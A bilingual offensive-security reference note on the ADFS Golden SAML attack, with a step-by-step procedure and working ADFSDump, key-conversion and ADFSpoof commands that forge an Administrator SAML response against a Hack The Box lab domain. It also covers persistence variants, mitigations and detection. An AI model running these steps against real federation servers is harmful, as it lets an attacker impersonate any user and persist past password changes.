---
topic: ADFS — Golden SAML
tags: [windows, active-directory, adfs, saml, golden-saml, persistence]
---

# ADFS — Golden SAML

[🌐 Español](adfs-golden-saml.md) | **English**

## Concept

ADFS signs `SAMLResponse` messages with a private key and a signing certificate. If an attacker with server access extracts that material, they can sign valid responses for any user and attribute without knowing their password. It is the SAML equivalent of a Golden Ticket: it works after password changes and survives until the certificate is rotated.

## When it applies

- ADFS with a federated application (SharePoint, AWS, GitLab, an internal portal).
- Control of the ADFS service account or the server hosting the role.
- Ability to read the key store (DPAPI, configuration database).
- The relying party trusts the signing certificate and does not validate the channel.

## Procedure

1. Confirm the SAML flow: `/adfs/ls/`, `SAMLRequest`, `SAMLResponse` and `postResponse`.
2. Identify the issuer and the relying party.
3. Use `ADFSDump.exe` to extract the private key, encrypted signing key, issuer and relying party configuration.
4. Convert the private key from hex to binary and the signing key from base64 to binary.
5. Forge a `SAMLResponse` with `ADFSpoof.py` for the target user.
6. POST it to the endpoint and use the resulting cookie.

## Commands

```powershell
.\ADFSDump.exe
```

```bash
echo "<HEX_KEY>" | tr -d '-' | xxd -r -p > private_key.bin
echo "<BASE64_SIGNING_KEY>" | base64 -d > encrypted_signing_key.bin
```

```bash
python ADFSpoof.py -b encrypted_signing_key.bin private_key.bin -s core.ghost.htb saml2 \
  --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' \
  --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' \
  --nameid 'Administrator@ghost.htb' \
  --rpidentifier 'https://core.ghost.htb:8443' \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute>'
```

Send the output as `SAMLResponse` in a POST to `/adfs/saml/postResponse`.

## Variants

- Forge only the `NameID` if the application does not validate attributes.
- Use `--assertions` to add groups or administrative roles.
- Reuse the stolen certificate against another relying party with the same trust.
- Persistence: create a user or a new certificate in ADFS so you no longer depend on the stolen material.

## Limitations

- The certificate must still be valid and trusted by the application.
- Some applications validate `InResponseTo`, `Destination` or the full message signature.
- ADFS 2019+ may protect the material with additional keys.
- Server or service-account access is a prerequisite.

## Mitigation

- Protect the ADFS server and service account as tier-0.
- Rotate signing certificates and keys on any suspicion.
- Monitor key extraction and access to ADFS configuration.
- Validate `InResponseTo`, `Destination`, `Audience` and the full signature at the relying party.
- Use certificate-based authentication and MFA for privileged access.

## Detection

- Execution of `ADFSDump`, `ADFSpoof`, Mimikatz or DPAPI dumping tools.
- Access to the ADFS configuration database or key store.
- `SAMLResponse` with unusual `NameID` or attributes.
- SAML logins from new IPs or devices without prior authentication.

## References

- [Mandiant — Golden SAML](https://www.mandiant.com/resources/blog/golden-saml-new-attack-surface-saml)
- [ADFSDump](https://github.com/mandiant/ADFSDump)
- [ADFSpoof](https://github.com/mandiant/ADFSpoof)
- [0xdf — Ghost](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html)
- [Ghost writeup](../../machines/windows/ghost/README.en.md)
